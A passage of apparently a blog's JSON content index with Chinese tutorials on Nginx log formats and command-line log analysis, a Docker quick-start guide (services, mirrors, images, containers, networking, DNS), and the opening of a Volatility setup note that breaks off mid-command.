变量名是Nginx内置的变量，不能随意改名字\n变量 解释 $remote_addr 客户端IP地址 $remote_user 客户端用户名称（用于HTTP认证，通常为-） [$time_local] 服务器本地的请求处理完成时间 \u0026quot;$request\u0026quot; 完整的原始请求行，如 \u0026quot;GET /index.html HTTP/1.1\u0026quot; $status HTTP响应状态码 $body_bytes_sent 发送给客户端的响应体大小（字节） \u0026quot;$http_referer\u0026quot; 请求的来源页面URL \u0026quot;$http_user_agent\u0026quot; 客户端的浏览器、操作系统等信息 \u0026quot;$http_x_forwarded_for\u0026quot; （重要） 记录了通过代理服务器访问的客户端真实IP地址 来看一个实际的main格式的access.log的条目：\n111.111.111.111 - - [28/Apr/2021:14:44:11 +0800] \u0026#34;GET /api/channel/unread.jsp HTTP/1.1\u0026#34; 200 65 \u0026#34;https://www.xxxx.cn/\u0026#34; \u0026#34;Mozilla/5.0...\u0026#34; \u0026#34;123.123.123.123\u0026#34; $remote_addr：111.111.111.111\n这是Nginx看到的客户端IP，可能是负载均衡/代理的IP，不一定是真实用户的IP\n$remote_user：- - 如果客户端经过了HTTP认证，这里会记录认证用户名，否则为-\n第一个 -：远程用户名（几乎不用，常为空） 第二个 -：认证用户名（如果用 Basic Auth 才会有） $time_local：28/Apr/2021:14:44:11 +0800 这是Nginx记录的本地时间，时区为+0800（北京时间）\n$request：GET /api/channel/unread.jsp HTTP/1.1 包含请求方法、URL路径和HTTP协议版本\n$status：200 HTTP状态码，表示请求成功\n$body_bytes_sent：65 响应体大小（字节数），不包含响应头\n$http_referer：https://www.xxxx.cn/ 请求来源页面，如果用户是从某个页面跳转过来的，这里会显示该页面URL，若没有则为-\n$http_user_agent：Mozilla/5.0... 客户端的User-Agent，表示浏览器或客户端的标识信息\n$http_x_forwarded_for：123.123.123.123 代理服务器通过HTTP头传递的真实客户端IP，用来识别经过代理时的原始用户地址\n这条日志告诉我们：\n在北京时间021-04-28 14:44:11，有一个客户端访问了接口/api/channel/unread.jsp，使用的是GET请求，HTTP版本是1.1，返回状态码200（成功），响应大小65字节，请求来自页面https://www.xxxx.cn/，使用的客户端是某个Mozilla浏览器/模拟器，其真实IP是123.123.123.123，但请求是经过代理，Nginx看到的源IP是111.111.111.111\n增强的自定义格式：JSON 为了便于程序（如 Logstash, Fluentd）解析，JSON格式也是目前的主流选择，属于典型的非默认格式\n它的结构清晰，键值对明确，机器解析友好，避免了awk和cut对字段位置的强依赖\nlog_format json_analytics escape=json \u0026#39;{\u0026#39; \u0026#39;\u0026#34;timestamp\u0026#34;: \u0026#34;$time_iso8601\u0026#34;,\u0026#39; \u0026#39;\u0026#34;client_ip\u0026#34;: \u0026#34;$remote_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;request\u0026#34;: \u0026#34;$request\u0026#34;,\u0026#39; \u0026#39;\u0026#34;status\u0026#34;: $status,\u0026#39; \u0026#39;\u0026#34;bytes_sent\u0026#34;: $body_bytes_sent,\u0026#39; \u0026#39;\u0026#34;http_referer\u0026#34;: \u0026#34;$http_referer\u0026#34;,\u0026#39; \u0026#39;\u0026#34;http_user_agent\u0026#34;: \u0026#34;$http_user_agent\u0026#34;,\u0026#39; \u0026#39;\u0026#34;real_ip\u0026#34;: \u0026#34;$http_x_forwarded_for\u0026#34;,\u0026#39; \u0026#39;\u0026#34;request_time\u0026#34;: $request_time,\u0026#39; \u0026#39;\u0026#34;upstream_time\u0026#34;: \u0026#34;$upstream_response_time\u0026#34;\u0026#39; \u0026#39;}\u0026#39;; access_log /var/log/nginx/access.log json_analytics; 新增字段:\n$request_time\nNginx从接收到请求第一个字节到发送完最后一个字节的总时长（秒），性能指标\n$upstream_response_time\n从Nginx连接到上游后端服务到接收完响应头的时长，用于判断是 Nginx 慢还是后端服务慢\n上面一个例子的JSON格式示例如下:\n{\u0026#34;timestamp\u0026#34;: \u0026#34;2025-08-16T14:30:00+09:00\u0026#34;, \u0026#34;client_ip\u0026#34;: \u0026#34;111.111.111.111\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;GET /api/users HTTP/1.1\u0026#34;, \u0026#34;status\u0026#34;: 200, \u0026#34;bytes_sent\u0026#34;: 1500, \u0026#34;http_referer\u0026#34;: \u0026#34;-\u0026#34;, \u0026#34;http_user_agent\u0026#34;: \u0026#34;curl/7.68.0\u0026#34;, \u0026#34;real_ip\u0026#34;: \u0026#34;123.123.123.123\u0026#34;, \u0026#34;request_time\u0026#34;: 0.025, \u0026#34;upstream_time\u0026#34;: \u0026#34;0.024\u0026#34;} JSON日志使用jq工具可以轻松解析：\n统计状态码为500的请求数量:\ncat access.log | jq \u0026#39;select(.status == 500)\u0026#39; | wc -l 找出请求时间最长的10个请求：\ncat access.log | jq \u0026#39;.request_time\u0026#39; | sort -nr | head -n 10 Docker环境下的日志 上文已经提到过，在Docker中，nginx日志输出到标准输出和标准错误，记录在docker的日志中\n虽然日志本身的格式不会变，但Docker的日志驱动可能（取决于设置）会在每行日志前添加额外信息：\n[时间戳] [日志流] [原始日志内容] 字段 含义 示例 时间戳 Docker记录该日志的时间，精确到纳秒 2025-08-20T02:30:00.123456789Z 日志流 指明日志来源：\n标准输出：stdout，对应访问日志\n标准错误：stderr`，对应错误日志 stdout或stderr 实际Docker日志示例（还是上面的例子）：\n2025-08-16T05:45:01.123456789Z stdout F 111.111.111.111 - - [28/Apr/2021:14:44:11 +0800] \u0026#34;GET /api/channel/unread.jsp HTTP/1.1\u0026#34; 200 65 \u0026#34;https://www.xxxx.cn/\u0026#34; \u0026#34;Mozilla/5.0...\u0026#34; \u0026#34;123.123.123.123\u0026#34; 2025-08-16T05:45:01.123456789Z\nDocker捕获日志的UTC时间（纳秒精度）\nstdout F\n日志来源是stdout，并且标记为F，表示一行完整日志\n此外还有P标记，示这是多行日志的一部分，被拆分了，需要和后续/前面的片段合并\n可以直接通过管道分析docker logs的输出，但通常会配置Docker的日志驱动将这些日志流自动转发到集中的日志管理平台进行统一分析\n比如，统计客户端IP出现次数的前10：\ndocker logs nginx | awk \u0026#39;{print $4}\u0026#39; | sort | uniq -c | sort -nr | head -n 10 错误日志（error.log） error.log记录Nginx启动和运行过程中的诊断信息，是排查问题的关键\n一般格式 时间戳 [错误级别] pid#tid: *cid 错误描述, client: 客户端IP, server: 服务端, request: \u0026#34;请求行\u0026#34;, host: \u0026#34;Host\u0026#34; 字段 说明 时间戳 错误发生时间 [错误级别] 当前条目错误的错误等级，具体看：错误等级 pid#tid Nginx工作进程ID和线程ID *cid 客户端连接序列号 错误描述 具体的错误信息，例如connect() to 127.0.0.1:9000 failed (13: Permission denied) client 发生错误的客户端IP server 请求的服务端 request 请求行，如\u0026quot;GET /api HTTP/1.1\u0026quot;` host 客户端请求的目标主机名 具体示例：\n2025/08/16 14:35:00 [crit] 12345#12345: *6789 connect() to 127.0.0.1:9000 failed (13: Permission denied) while connecting to upstream, client: 192.168.1.10, server: example.com, request: \u0026#34;GET /api HTTP/1.1\u0026#34;, host: \u0026#34;example.com\u0026#34; 时间戳：2025/08/16 14:35:00 错误级别：crit（严重错误） pid#tid：12345#12345 *cid：*6789 错误描述：connect() to 127.0.0.1:9000 failed (13: Permission denied) while connecting to upstream 客户端：192.168.1.10 服务端：example.com 请求：\u0026quot;GET /api HTTP/1.1\u0026quot; Host：example.com 分析：\n客户端192.168.1.10请求 /api接口时，Nginx尝试连接上游服务127.0.0.1:9000失败，原因是权限被拒绝（Permission denied）。日志级别为 crit，说明这是严重错误，需要检查Nginx或上游服务的权限设置\n分析技巧 网站流量核心指标分析 (PV \u0026amp; UV) PV (Page View，页面浏览量) 和 UV (Unique Visitor，独立访客) 是衡量网站价值和用户行为趋势的重要指标\n统计总UV (根据IP) 提取第1个字段(IP)，排序，去重，最后统计独立IP总数：\nawk \u0026#39;{print $1}\u0026#39; access.log | sort | uniq | wc -l 统计总PV 直接统计日志总行数即为PV：\nwc -l access.log 统计某时间段的UV / PV 统计2021年4月28日14:00-14:59的UV：\ngrep \u0026#34;28/Apr/2021:14\u0026#34; access.log | awk \u0026#39;{print $1}\u0026#39; | sort | uniq | wc -l 使用sed进行更精确的时间段筛选 (14点到20点)：\nsed -n \u0026#39;/28\\/Apr\\/2021:14/,/28\\/Apr\\/2021:20/p\u0026#39; access.log | awk \u0026#39;{print $1}\u0026#39; | sort | uniq | wc -l 访问来源与异常排查 (IP \u0026amp; URL) 用于判断是否被攻击、接口是否存在Bug或排查流量报警\n查询访问最频繁的Top 10 URL 提取第7字段(URL)，排序，去重并计数，按计数值倒序排列:\nawk \u0026#39;{print $7}\u0026#39; access.log | sort | uniq -c | sort -k1 -nr | head -n 10 查询访问最频繁的Top 10 IP awk \u0026#39;{print $1}\u0026#39; access.log | sort | uniq -c | sort -k1 -nr | head -n 10 查看指定IP在某天访问了哪些 URL (Top 10) grep \u0026#34;111.111.111.111\u0026#34; access.log | grep \u0026#34;28/Apr/2021\u0026#34; | awk \u0026#39;{print $7}\u0026#39; | sort | uniq -c | sort -nr | head -n 10 性能与爬虫分析 统计爬取次数 grep -i \u0026#39;spider\\|bot\u0026#39; access.log | wc -l 统计每分钟/每秒的请求数 (Top 20) 每分钟: 截取时间字段($4)的第2到18位(到分钟)\nawk \u0026#39;{print $4}\u0026#39; access.log | cut -c 2-18 | sort | uniq -c | sort -nr | head -n 20 每秒: 截取时间字段($4)的第2到21位(到秒)\nawk \u0026#39;{print $4}\u0026#39; access.log | cut -c 2-21 | sort | uniq -c | sort -nr | head -n 20 分析请求响应时间 (需自定义日志格式) 前提: 确保log_format中包含了$request_time，我们假设它在最后一个字段\n列出传输时间超过3秒的Top10请求 $NF代表最后一个字段，此命令筛选出最后一个字段值大于3的行：\nawk \u0026#39;$NF \u0026gt; 3 {print $NF, $7}\u0026#39; access.log | sort -k1 -nr | head -n 10 列出最耗时的Top10请求 awk \u0026#39;{print $NF, $7}\u0026#39; access.log | sort -k1 -nr | head -n 10 +++\n暂时就先讲到这，毕竟只是入个门，详细使用就在实践里面学习吧\n如果之后我需要更加深入使用，这篇文章也会更新的~\n","date":"2025-07-24T22:15:30+08:00","image":"http://picture.928330.xyz/typora/94b5f0d5aceb41498d7d03bcff81ecf5.jpeg","permalink":"https://blog.928330.xyz/p/nginx%E5%85%A5%E9%97%A8/","title":"Nginx入门"},{"content":"本教程针对的是linux环境下的docker\nDocker简介 什么是Docker Docker是一个开源的容器化平台，旨在简化应用程序的开发、交付和运行\n它允许开发者将应用程序及其所有依赖项打包到一个轻量级的、可移植的容器中，从而确保在不同环境中都能一致地运行\n容器之间是隔离的，像一个个小型的沙箱\n一句话：Docker就像一个轻量级虚拟机，可以在不同的环境中快速部署运行同样的应用程序\nDocker的主要概念 容器（Container） 容器是Docker的核心，它就像是一个隔离的小程序环境，打包了应用运行所需的一切\n与传统虚拟机相比，容器不需要包含整个操作系统，只共享宿主机内核，因此占用资源小、启动速度快\n无论在本地、测试环境，还是部署到服务器，运行结果都一致\n每个容器互相隔离，修改不会影响宿主机或其他容器\n比如，运行一个Python应用的容器，就像在一个只包含Python的迷你Linux系统里运行它\n镜像（Image） 镜像是构建容器的模板或快照，可以理解为包含了系统环境+应用程序代码+配置的“包”\n镜像一经创建就不变，部署更可靠\n比如我们下载nginx这个镜像，然后就能启动一个nginx容器，就像虚拟机的快照和启动运行\n即使我们更改了容器，镜像也不会改变，我们也可以把改动的容器制作为新的镜像，类似拍摄快照\n一个镜像可以启动成多个容器，就像一个类能被实例化成多个对象\nDockerfile 它是用来构建镜像的配置脚本\n里面写入了构建命令，如基于哪个镜像、复制哪些文件、安装哪些软件等\n使用docker build命令可以将Dockerfile构建成镜像，然后启动对应的容器\n仓库（Registry） 存储和分发镜像的平台\n比如DockerHub，就是Docker官方提供的镜像仓库平台（类似GitHub），有很多官方镜像可以免费下载\nsystemctl命令使用 systemctl是现代Linux发行版中核心的系统和服务管理器\n它负责启动、停止、检查和管理系统上的各种后台服务（也称为守护进程）\n在使用任何Docker命令之前，必须确保Docker的后台服务正在运行\n接下来我们将以Docker服务为例结合介绍它的各种命令\n服务的生命周期管理 这是 systemctl最核心的功能，用于控制一个服务的运行、停止和重启等\n启动服务 当一个服务处于停止状态时，使用start命令来启动它\nsystemctl start 服务名称 eg：\nsystemctl start docker 此命令会启动Docker服务，Docker守护进程会在后台开始运行，准备接收和处理Docker相关的命令\n通常执行此类操作需要管理员权限\n停止服务 停止一个正在运行的服务\nsystemctl stop 服务名称 eg：\nsystemctl stop docker 此命令会向Docker服务发送停止信号，使其安全地终止\n对于Docker来说，这意味着Docker守护进程会关闭，所有通过该守护进程运行的容器也会停止\n重启服务 这是一个便捷的组合命令，相当于先停止服务再立即启动它\n这在修改了服务的配置文件后，需要让新配置生效时非常有用\nsystemctl restart 服务名称 eg：\nsystemctl restart docker 如果修改了Docker的配置文件（例如 /etc/docker/daemon.json），执行此命令会重启 Docker 服务，使其加载并应用新的配置\n重新加载服务配置 在不中断服务的情况下，重新加载其配置文件\nsystemctl reload 服务名称 eg：\nsystemctl reload docker 这个命令比restart更为温和，它会请求服务重新读取其配置文件，而不会终止正在运行的主进程\n但是，并非所有服务都支持reload操作，如果服务不支持此操作，systemctl可能会转而执行restart\nDocker服务通常建议使用restart而不是reload来应用配置更改\n服务的状态与信息查看 查看服务详细状态 获取一个服务的全面信息，包括它是否正在运行、最近的日志、进程ID (PID) 等\nsystemctl status 服务名称 eg：\nsystemctl status docker 这是排查服务问题的首选\n它会清晰地显示服务的active状态，如 active (running) 或 inactive (dead)），并附带最近几条相关的日志记录\n检查服务是否正在运行 快速检查一个服务当前是否处于活动状态\nsystemctl is-active 服务名称 eg：\nsystemctl is-active docker 此命令的返回值非常简洁：\n如果服务正在运行，它会输出active并返回状态码 0\n如果服务未运行，它会输出inactive\n这在编写自动化脚本时很有用，可以根据返回值来判断是否需要执行某些操作\n服务的开机自启动管理 设置开机自启动 将一个服务设置为在系统启动时自动运行\nsystemctl enable 服务名称 eg：\nsystemctl enable docker 执行此命令后，systemd会创建必要的符号链接，确保下次系统启动时，Docker服务会自动启动\n这是一个一次性的设置，之后无需再手动启动\n禁止开机自启动 取消一个服务的开机自启动设置\nsystemctl disable 服务名称 eg：\nsystemctl disable docker 此命令会移除enable命令创建的符号链接，下次系统重启后，Docker服务将不会自动运行\n这并不会影响当前正在运行的服务状态\n检查服务是否开机自启动 查看一个服务当前是否被设置为开机自启动\nsystemctl is-enabled 服务名称 eg：\nsystemctl is-enabled docker 此命令会返回 enabled (已设置) 或 disabled (未设置)\nDocker更改源 不知道为什么国内忽然无法访问官方的镜像仓库了，为了加快Docker镜像的下载速度，我们通常需要将 Docker的默认源registry.docker.io更换为国内的镜像加速源\n检查安装状态 首先要确认你的系统已正确安装了Docker，可以执行：\ndocker --version 返回的是docker版本，确认无误后继续\n编辑配置文件 Docker 的镜像源配置文件通常位于/etc/docker/daemon.json，如果文件不存在，可以手动创建\n使用任意文本编辑器打开，例如使用vim（不知道怎么使用vim的可以看一眼：vim使用教程 ）：\nvim /etc/docker/daemon.json 然后将内容修改为以下格式：\n{ \u0026#34;registry-mirrors\u0026#34;: [ \u0026#34;https://\u0026lt;加速地址1\u0026gt;\u0026#34;, \u0026#34;https://\u0026lt;加速地址2\u0026gt;\u0026#34; ] } 当然你还能添加更多加速地址，但是注意最后一个加速地址后面就不能有逗号了\nb站up:大海资源整理的当前可用的国内镜像源：https://www.dhzy.fun/archives/6852.html\n重启服务 修改完配置后，需要重启 Docker 服务以使配置生效：\nsystemctl restart docker 验证是否生效 可以执行如下命令查看当前镜像加速器配置是否生效：\ndocker info | grep -A 10 \u0026#34;Registry Mirrors\u0026#34; 从输出中查找包含Registry Mirrors的那一行，并显示它后面10行\n如果是下面这样的输出，说明配置成功了：\n注意事项 修改配置文件时要确保JSON格式正确，例如逗号不能多不能少\n有些加速源如阿里云需要登录账号并绑定使用，获取专属地址\n如果使用的是非systemd系统，要使用service命令重启Docker\nDocker使用 镜像管理 查找镜像 docker search \u0026lt;镜像名称\u0026gt; docker search使用的是DockerHub的HTTP API，没有镜像源概念，无法走国内加速\n如果无法访问，必须使用代理，或者通过别的方式访问官网：https://hub.docker.com/\n拉取镜像 从仓库中下载一个镜像到你的本地机器\ndocker pull \u0026lt;镜像名称\u0026gt;:\u0026lt;标签\u0026gt; 镜像名称：想要下载的软件，例如nginx\n标签 ：通常用来表示软件的版本，例如latest表示最新版，1.21表示特定版本\n​ 如果省略标签，Docker 会默认使用latest\neg：\ndocker pull nginx:latest 此命令会从镜像源下载最新版本的Nginx镜像\n查看本地镜像 列出所有已经下载到本地计算机上的镜像\ndocker images REPOSITORY：仓库名\nTAG ：标签\nIMAGE ID：镜像的唯一ID\nCREATED：创建时间\nSIZE：镜像大小\n保存更改的镜像 docker commit [选项] \u0026lt;容器ID\u0026gt;/\u0026lt;容器名称\u0026gt; \u0026lt;镜像名称\u0026gt;:\u0026lt;标签\u0026gt; 常用选项：\n-m \u0026quot;提交信息\u0026quot;：为此次操作添加描述性说明\n类似于 Git 的 commit message，便于记录修改内容\n-a \u0026quot;作者\u0026quot;：指定作者信息\n方便追踪是谁进行了修改或创建操作\neg：\ndocker commit -m=\u0026#34;update\u0026#34; -a=\u0026#34;kakahuote\u0026#34; 8950b5741b30 mynginx:mod 这个命令会执行以下操作：\n把名为8950b5741b30的容器保存为一个新的镜像 添加说明信息\u0026quot;update\u0026quot;，记录镜像的更改内容 指定作者为kakahuote 创建一个名为mynginx、标签为mod的新镜像 删除镜像 当某个镜像不再需要时，可以将其从本地删除以释放磁盘空间\ndocker rmi \u0026lt;镜像ID\u0026gt;/\u0026lt;镜像名称\u0026gt;:\u0026lt;标签\u0026gt; 只能删除没有被任何容器（包括已停止的容器）使用的镜像\n如果需要删除一个被使用的镜像，必须先删除所有依赖它的容器\n也可以使用-f选项强制删除，但这可能会导致依赖该镜像的容器无法再次启动或者其他未知错误，慎用！\n如果不指定标签，默认删除的会是latest标签，如果没有latest则会报错，所以建议指定标签删除\neg：\ndocker rmi mynginx:mod 容器管理 创建并运行容器 docker run [选项] \u0026lt;镜像名称\u0026gt;:\u0026lt;标签\u0026gt; 常用选项：\n--name：为容器指定一个自定义的名称\n如果省略，Docker会自动生成一个随机名称\n-d：以分离模式在后台运行容器\n这对于运行像Web服务器这样的长期服务很重要，否则容器会占据你的终端进行输出和报错等行为\n-P(大写)：将容器内部所有暴露的端口随机映射到主机的空闲端口上\n-p(小写)：指定端口映射，其常用格式如下：\n主机端口:容器端口\ndocker run -d -p 8080:80 nginx 此命令将主机的8080端口映射到容器的80端口\n\u0026lt;IP地址\u0026gt;:主机端口:容器端口\n指定只将主机的特定IP地址的端口映射到容器\ndocker run -d -p 127.0.0.1:8081:80 nginx 此命令将主机127.0.0.1这个回环地址的8081端口映射到容器的80端口\n这样，只有在本机才能通过127.0.0.1:8081访问，来自外部网络的访问会被拒绝\n主机端口:\u0026lt;容器端口/协议\n默认情况下，端口映射使用的是TCP协议，也可以显式指定UDP协议\nPdocker run -d -p 8082:53/udp nginx 此命令将主机的8082端口映射到nginx容器的53UDP端口\n--rm：使容器在停止后被自动删除\n适合用于测试和运行一次性任务\neg：\ndocker run --name my-nginx -d -p 8080:80 nginx 这个命令会执行以下操作：\n检查本地是否存在nginx:latest镜像，如果不存在，会自动拉取\n基于此镜像创建一个名为 my-nginx 的容器\n-d：让这个容器在后台持续运行\n-p 8080:80：将你本机的8080端口的流量转发到容器内部的80端口（Nginx默认在80端口监听）\n命令执行后，在浏览器中访问http://你的主机IP地址:8080或http://localhost:8080\n如果看到Nginx的欢迎页面，则表示容器已成功运行\n查看正在运行的容器 docker ps CONTAINER ID：容器的唯一标识，可以用全部或者前几位操作该容器，只要能唯一识别\nIMAGE：使用的镜像\nCOMMAND：容器启动时运行的命令\nCREATED：容器创建的时间\nSTATUS：容器状态，这里的字段值是UP，说明是一个正在运行的容器\nPORTS：端口映射\n0.0.0.0:8080-\u0026gt;80/tcp：主机所有IPv4地址的8080端口被映射到容器内部的80端口（TCP 协议）\n:::8080-\u0026gt;80/tcp：主机所有IPv6地址的8080端口也映射到容器内部的80端口（TCP 协议）\nNAMES：自定义的容器的名字\n查看所有容器 docker ps -a -a是all的缩写，代表列出所有容器，包括那些已经停止运行的\n这个命令可以找到旧的、已停止的容器，以便重新启动它们或将它们删除以进行清理\n这里的STATUS字段是exited，说明这是一个退出的、不在运行的容器\n停止容器 docker stop \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; 说明: 此命令会向容器内的主进程发送一个 SIGTERM 信号，请求其正常关闭。应用程序会接收到这个信号并执行关闭前的清理工作。\neg：\ndocker stop nginx 停止后，容器不在运行列表之中\n启动一个已停止的容器 docker start \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; 这个命令会使一个处于Exited状态的容器恢复到Up状态，容器会保留其上次停止时的所有配置和数据。\n示例: docker start my-nginx\n删除容器 docker rm \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; 默认情况下，不能删除一个正在运行的容器，必须先使用docker stop将其停止\n如果确定要删除一个运行中的容器，可以添加-f参数来强制执行\n容器信息查看与交互 查看端口映射 此命令可以快捷地查看一个容器的端口映射情况\ndocker port \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; eg：\ndocker port nginx 容器内部的80端口被映射到了：\n0.0.0.0:8080：表示主机的所有IPv4地址上的8080端口 [::]:8080：表示主机的所有IPv6地址上的8080端口 也就是说，我们可以使用以下任意方式访问这个容器内的Nginx服务：\nhttp://localhost:8080 http://127.0.0.1:8080 http://\u0026lt;主机的IP\u0026gt;:8080 如果启用了IPv6网络，还可以使用IPv6地址访问，如http://[::1]:8080 查看容器日志 docker logs [选项] \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; 常用选项：\n-f：持续跟踪并输出日志\n--tail：仅显示日志的最后N行\neg：\ndocker logs nginx 在容器内部执行命令 可以在一个运行中的容器内执行命令，而不进入其交互式Shell\ndocker exec \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; \u0026lt;命令\u0026gt; eg：\ndocker exec nginx ls -l 此命令会在名为nginx的容器内部执行ls -l 命令，并返回结果，而我们的终端仍然停留在主机上\n进入容器的交互式终端 对于更复杂的调试，我们就需要一个完整的Shell环境来在容器内部进行操作\ndocker exec -it \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; /bin/bash -it是两个选项的组合：\n-i保持标准输入开启，-t分配一个伪终端，这共同创建了一个可以交互的命令行界面\n/bin/bash是一个常见的Shell程序，有些镜像可能提供的是/bin/sh，比较不好用\n也可以在创建容器的时候就进入其交互式终端：\ndocker run -it \u0026lt;镜像名称\u0026gt;:\u0026lt;标签\u0026gt; /bin/bash eg：\ndocker exec -it nginx /bin/bash 执行后命令提示符改变，表示已经进入了容器，可以像在普通Linux环境中一样运行命令\n如果想要退出，可以使用Ctrl+D，或者输入exit\n容器网络与连接 除了端口映射，Docker还提供了强大的网络功能，允许容器之间方便、安全地互相通信\n在开始之前，我们需要知道docker的网络类型有哪些\n网络类型 bridge bridge是Docker默认的网络类型，适用于单个主机上容器之间的通信\n每个容器会获得一个虚拟网卡和私有IP地址 容器之间可以通过容器名通信 可以使用-p参数将容器端口映射到宿主机端口，实现外部访问 默认的bridge网络名称就是bridge 适用于需要隔离、但仍允许访问外部网络的容器场景\nhost 容器与宿主机共享网络栈，不做任何隔离\n容器没有自己的IP地址 使用宿主机的IP和端口 性能更好，网络开销低 容器中暴露的端口不需要通过-p映射 适用于对网络性能要求极高的场景\nnone 容器没有网络连接\n没有分配IP地址 不能访问外部网络，也不能与其他容器通信 除非手动配置网络，否则容器完全断网 适用于需要自定义网络配置或完全隔离网络的场景\noverlay 用于Docker Swarm集群环境中，支持多主机容器通信\n可跨宿主机连接容器 基于VXLAN技术封装 需要Swarm模式支持 适用于需要将多个 Docker 主机上的容器连接成一个网络的分布式应用\nmacvlan 让容器像宿主机一样，直接拥有局域网内的独立IP\n容器像物理主机一样直接连接到物理网络 容器具有独立MAC和IP地址 可被局域网中的其他设备直接访问 适用于容器需要与局域网设备完全对等通信的场景，例如作为局域网服务节点\ncontainer 多个容器共享同一个网络命名空间，通过--network container:\u0026lt;容器名\u0026gt;实现\n使用另一个容器的网络配置 容器之间通过进程间通信 适用于容器需要共享网络堆栈（如日志、监控）的情况\n查看当前已创建的网络 docker network ls NETWORK ID：网络的唯一标识\nNAME：网络名称\nDRIVER：网络类型\nSCOPE：作用范围，通常是local(本地网络)或swarm(集群网络)\n创建自定义网络 docker network create -d bridge \u0026lt;网络名称\u0026gt; -d：指定网络类型。对于单机环境，bridge是最常用的类型 eg：\ndocker network create -d bridge my-net 删除已定义的网络 docker network rm \u0026lt;网络名\u0026gt;/\u0026lt;网络ID\u0026gt; eg：\ndocker network rm my-net 连接容器到网络 我们可以在启动容器时使用--network选项将其连接到指定的网络\ndocker run -d --name \u0026lt;容器名称\u0026gt; --network \u0026lt;网络名称\u0026gt; \u0026lt;镜像名称\u0026gt; eg：\n我们创建两个容器并都连接到my-net网络\n首先创建第一个容器 nginx-1：\ndocker run -d --name nginx-1 --network my-net nginx 然后创建第二个容器 nginx-2：\ndocker run -d --name nginx-2 --network my-net nginx 容器间通信 当多个容器连接到同一个自定义网络时，它们可以通过容器名称作为主机名直接互相访问\n我们可以进入一个容器来测试与另一个容器的连通性\neg：\n进入nginx-1容器，然后ping nginx-2\ndocker exec -it nginx-1 /bin/bash 进入容器后，由于nginx镜像默认没有 ping 工具，我们需要先安装它：\napt-get update \u0026amp;\u0026amp; apt-get install -y iputils-ping 安装完成后，执行ping：\nping nginx-2 可以看到，nginx-1能够成功解析nginx-2的名称并与之通信，这证明了容器间的互联已经建立shell\n查看容器网络信息 docker inspect \u0026lt;对象ID或名称\u0026gt; docker inspect是一个非常强大的命令，用于查看容器、镜像、网络、卷等对象的详细底层信息\n它会返回一段JSON 格式的数据，包含几乎所有属性，比如网络配置、挂载卷、环境变量、启动命令等\n这里我们查看容器的信息，并过滤网络部分：\ndocker inspect \u0026lt;容器ID\u0026gt;/\u0026lt;名称\u0026gt; | grep -A 10 \u0026#34;NetworkSettings\u0026#34; DNS配置 全局配置 我们可以为所有Docker容器配置默认的DNS服务器\n这需要在Docker的守护进程配置文件/etc/docker/daemon.json中添加dns字段\n{ \u0026#34;dns\u0026#34;: [ \u0026#34;114.114.114.114\u0026#34;, \u0026#34;8.8.8.8\u0026#34; ] } 修改此文件后，必须重启 Docker 服务才能生效\n容器独立配置 如果只想为某个特定的容器指定 DNS，可以在docker run时使用相关选项\ndocker run [DNS选项] \u0026lt;镜像名称\u0026gt; 常用DNS选项：\n--dns=\u0026lt;IP地址\u0026gt;：指定容器使用的DNS服务器地址 --dns-search=\u0026lt;域名\u0026gt;：指定DNS搜索域。当查找一个短主机名时，会自动追加这个域名进行尝试 --hostname=\u0026lt;主机名\u0026gt;：设置容器内部的主机名 eg：\ndocker run -it --rm --hostname=myhost --dns=114.114.114.114 nginx 这个命令会启动一个临时的nginx容器，其主机名为myhost，使用114.114.114.114作为DNS服务器\n常用DNS服务器 阿里云公共 DNS\n223.5.5.5 223.6.6.6 114 DNS（国内知名公共 DNS）\n114.114.114.114 114.114.115.115 Google 公共 DNS\n8.8.8.8 8.8.4.4 Cloudflare DNS\n1.1.1.1 1.0.0.1 OpenDNS\n208.67.222.222 208.67.220.220 Docker实例安装 各种镜像安装过程都大差不差，这里以nginx为例，其他的也能作参考\n查看可用版本 访问Nginx镜像库地址 https://hub.docker.com/_/nginx?tab=tags 可以copy的字段是拉取当前版本镜像的命令，下面是一些介绍：\n字段 含义 Digest 每个平台构建出的镜像唯一标识符 OS/ARCH 表示支持的操作系统和架构 Vulnerabilities 镜像中检测出的安全漏洞数量\n分等级：严重（红）、高（橙）、中（黄）、低（灰） Compressed size 镜像下载时的压缩大小 使用命令查看 docker search nginx 我们一般都使用最新的，也就是latest\n拉取最新镜像 docker pull nginx:latest 查看是否拉取成功 docker images 运行容器 docker run --name nginx -p 8080:80 -d nginx 参数说明：\n\u0026ndash;name nginx：容器名称改成nginx -p 8080:80： 端口进行映射，将本地8080端口映射到容器内部的80端口 -d：设置容器在在后台一直运行 测试访问 http://localhost:8080 ","date":"2025-07-23T19:24:02+08:00","image":"http://picture.928330.xyz/typora/docker.jpg","permalink":"https://blog.928330.xyz/p/%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8Bdocker/","title":"快速上手docker"},{"content":"前置步骤/问题解决 下载 Volatility2：https://github.com/volatilityfoundation/volatility\nVolatility3：https://github.com/volatilityfoundation/volatility3\npython版本 update-alternatives是Debian/Ubuntu系统提供的管理系统级默认命令的工具，通过维护符号链接工作\n设置优先级，一般使用整数：\nupdate-alternatives --install /usr/bin/python python /usr/bin/python2 100 update-alternatives --install /usr/bin/python python /usr/bin/python3 150 查看当前可识别的版本：\nupdate-alternatives --list python /usr/bin/python2 /usr/bin/python3 /usr/bin/python3.11 切换版本：\nupdate-alternatives --config python 有 3 个候选项可用于替换 python (提供 /usr/bin/python)。 选择 路径 优先级 状态 ------------------------------------------------------------ 0 /usr/bin/python3 150 自动模式 * 1 /usr/bin/python2 100 手动模式 2 /usr/bin/python3 150 手动模式 3 /usr/bin/python3.11 125 手动模式 要维持当前值[*]请按\u0026lt;回车键\u0026gt;，或者键入选择的编号： 输入数字切换版本\n虚拟环境 安装 volatility2是基于python2开发的，所以虚拟环境也要使用python2的virtualenv创建\n这里以我下载python2.7版本的虚拟环境步骤为例，记录一些遇到的问题\n首先下载pip2，需要切换到python2的环境，并且由于linux系统大多放弃了apt对python2的支持，所以无法使用apt install下载，需要手动安装\n1.下载脚本：\ncurl 